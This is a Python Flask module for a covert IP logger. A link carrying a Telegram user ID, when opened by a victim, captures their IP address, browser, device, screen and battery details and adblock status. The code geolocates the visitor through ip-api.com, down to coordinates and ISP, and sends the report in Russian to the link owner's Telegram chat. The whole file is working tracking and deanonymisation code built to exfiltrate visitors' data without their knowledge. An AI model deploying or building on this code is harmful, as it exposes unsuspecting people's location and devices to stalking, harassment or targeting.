import requests
import json
import re
import time

import datetime

from typing import Dict, Optional
from dataclasses import dataclass

from flask import Blueprint, request, render_template, redirect

from app.config import Config


@dataclass
class IPLog:
    receiver_tg_id: int
    ip_address: str
    last_response: float = time.time()
    platform: Optional[str] = None
    browser: Optional[str] = None
    zip: Optional[str] = None
    org: Optional[str] = None
    city: Optional[str] = None
    country: Optional[str] = None
    countryCode: Optional[str] = None
    regionName: Optional[str] = None
    lat: Optional[str] = None
    lon: Optional[str] = None
    timezone: Optional[str] = None
    isp: Optional[str] = None
    proxy: Optional[str] = None
    hosting: Optional[str] = None
    screen_width: Optional[str] = None
    screen_height: Optional[str] = None
    client_width: Optional[str] = None
    client_height: Optional[str] = None
    charging_percent: Optional[str] = None
    charging_status: Optional[str] = None
    charging_time: Optional[str] = None
    discharging_time: Optional[str] = None
    adblock: Optional[str] = None

    def get_info(self):
        url = f"http://ip-api.com/json/{self.ip_address}?fields=16969727"
        response = requests.get(url)
        data = json.loads(response.text)
        self.__setattrs__(**data)

    def __setattrs__(self, **kwargs):
        for k, v in kwargs.items():
            self.__setattr__(k, v)

    def get_log(self):
        return f"""❗ На вашем логгере новый посетитель ❗
<b>Время:</b> {datetime.datetime.today().strftime('%Y-%m-%d-%H:%M:%S')}
____________________
<b>Айпи:</b> {self.ip_address}
<b>Страна:</b> {self.country}
<b>Код страны:</b> {self.countryCode}
<b>Регион:</b> {self.regionName}
<b>Город:</b> {self.city}
<b>Часовой пояс:</b> {self.timezone}
<b>Прокси/VPN:</b> {self.proxy}
<b>Хостинг:</b> {self.hosting}
<b>Организация:</b> {self.org}
<b>Провайдер:</b> {self.isp}
<b>Почтовый индекс:</b> {self.zip}
<b>Браузер:</b> {self.browser}
<b>Система:</b> {self.platform}
<b>Координаты:</b> <a href="https://maps.google.com/maps?q=%40{self.lat},{self.lon}">{self.lat}, {self.lon}</a>
<b>Размер экрана:</b> {self.screen_width}x{self.screen_height}
<b>Размер экрана браузера:</b> {self.client_width}x{self.client_height}
<b>Уровень заряда:</b> {self.charging_percent}
<b>Устройство заряжается в данный момент:</b> {self.charging_status}
<b>Осталось до полной зарядки:</b> {self.charging_time}
<b>Осталось до полной разрядки:</b> {self.discharging_time}
<b>AdBlock:</b> {self.adblock}"""\
    .replace("None", "не определился")\
    .replace("True", "Да")\
    .replace("False", "Нет")

    def send_log(self):
        requests.get(
            f"https://api.telegram.org/bot{Config.API_TOKEN}/sendMessage",
            data={"text": self.get_log(), "chat_id": self.receiver_tg_id, "parse_mode": "HTML"}
        )


ips: Dict[str, IPLog] = dict()


bp = Blueprint(
    "ip_logger",
    __name__,
    template_folder="../../templates"
)

pattern = re.compile(r"(?:Mozilla\/5\.0 \()(.+?)(?:\))")


@bp.route("/<int:tg_user_id>")
def logger(tg_user_id: int):
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)

    if ips.get(ip) is None:
        ips[ip] = IPLog(ip_address=ip, receiver_tg_id=tg_user_id)

    elif time.time() - ips[ip].last_response <= 60:
        return redirect("https://google.com")
    else:
        ips[ip].last_response = time.time()
        ips[ip].receiver_tg_id = tg_user_id

    platform = pattern.search(request.user_agent.string)
    ips[ip].platform = request.user_agent.string if platform is None \
        else platform.group(1)

    ips[ip].browser = f"{request.user_agent.browser}\
        {request.user_agent.version}".replace(" ", "")
    ips[ip].last_response = time.time()
    return render_template("index.html")


@bp.route("/addlog", methods=['POST'])
def add_log():
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)

    if time.time() - ips[ip].last_response >= 3:
        return "fuck u"

    new_data = request.get_json()
    ips[ip].get_info()
    ips[ip].__setattrs__(**new_data)
    ips[ip].send_log()

    return "ok"
